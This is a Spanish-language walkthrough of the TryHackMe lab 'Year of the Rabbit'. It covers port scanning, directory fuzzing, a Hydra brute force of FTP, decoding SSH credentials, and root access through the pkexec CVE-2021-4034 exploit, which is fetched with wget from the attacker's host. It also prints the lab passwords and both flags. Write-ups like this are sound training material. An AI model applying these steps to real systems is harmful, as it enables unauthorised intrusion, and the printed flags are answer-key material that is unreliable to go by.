@@ -1,0 +1,85 @@
+Tryhackme
+Year of the Rabbit
+
+Nmap
+	nmap -p- -sS -sC -sV --open --min-rate 2500 -vvv -n -Pn 10.10.40.228 -oN nmap
+
+	• 21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.2
+	• 22/tcp open ssh syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+	• 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.10 (Debian)
+
+Cuando abrimos el puerto 80, no encontramos nada más que un servidor Debian. Procederemos a fuzzear.
+
+Fuzzing
+
+	gobuster dir -u http://10.10.40.228 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+
+	• /assets 
+
+Dentro de "/assets" no encontramos nada relevante, pero inspeccionamos la carpeta "/assets/style.css". En un comentario encontramos lo siguiente:
+
+	/* Nice to see someone checking the stylesheets.
+    Take a look at the page: /sup3r_s3cr3t_fl4g.php
+   */
+
+Procedemos a entrar en "/sup3r_s3cr3t_fl4g.php" donde aparece una ventana emergente que dice "Word of advice... Turn off your javascript..." y nos redirecciona a un rickroll. Bloqueando el JavaScript para que no nos redireccione, encontramos el siguiente texto:
+
+"Love it when people block Javascript...
+This is happening whether you like it or not... The hint is in the video. If you're stuck here, then you're just going to have to bite the bullet!
+Make sure your audio is turned up!"
+
+Al interceptar la petición con Burp Suite, vemos que hay un directorio oculto:
+
+>GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
+
+Encontramos un índice nuevo, donde hay una imagen "hot_Babe.png". Al leer la foto, encontramos un listado de posibles contraseñas para entrar en el puerto FTP.
+
+Usando el listado de contraseñas que ya encontramos, utilizaremos Hydra para realizar un ataque de fuerza bruta e ingresar por el puerto FTP.
+
+>Hydra -l ftpuser -P pass ftp://10.10.141.178
+
+La contraseña de ftpuser es "5iez1wGXKfPKQ". Procedemos a ingresar con usuario y contraseña por el puerto FTP. Estamos dentro del puerto FTP y encontramos "Eli's_Creds.txt".
+
+>get Eli's_Creds.txt
+
+Encontramos un código encriptado que, cuando lo pasamos por Chat GPT, descubrimos que el cifrado se llama "Brainfuck". Al decodificarlo, encontramos lo siguiente:
+
+User: eli
+Password: DSpDiM1wAEwid
+
+Usaremos este usuario y contraseña para ingresar por el puerto SSH. Estamos dentro, ahora necesitamos elevar privilegios. Para eso, buscaremos qué comandos/scripts se ejecutan como root.
+
+>find / -perm -4000 2>/dev/null
+
+Encontramos "/usr/bin/pkexec" que, al ver la versión, vemos que es antiguo.
+
+>/usr/bin/pkexec --version
+	•pkexec version 0.105
+
+Procedemos a buscar un exploit para explotar la vulnerabilidad en ese servicio. Ahora necesitamos subir el archivo al servidor SSH. Para esto, primero montamos un servidor dentro de nuestra PC.
+
+>python3 -m http.server 80
+
+Luego, para poder subir el exploit al servidor SSH, nos dirigimos a la carpeta "/tmp" donde tenemos permisos de escritura.
+
+>cd /tmp
+
+>$:tmp/ wget 10.18.112.21:80/CVE-2021-4034.py
+
+Ya tenemos el exploit dentro del servidor SSH, ahora lo ejecutamos.
+
+>python3 CVE-2021-4034.py
+	Nos hace una pregunta de Y/N
+
+>n
+
+>whoami
+	root
+
+Ya como root, nos dedicamos a buscar las flags.
+
+user.txt:
+THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
+
+root.txt:
+THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
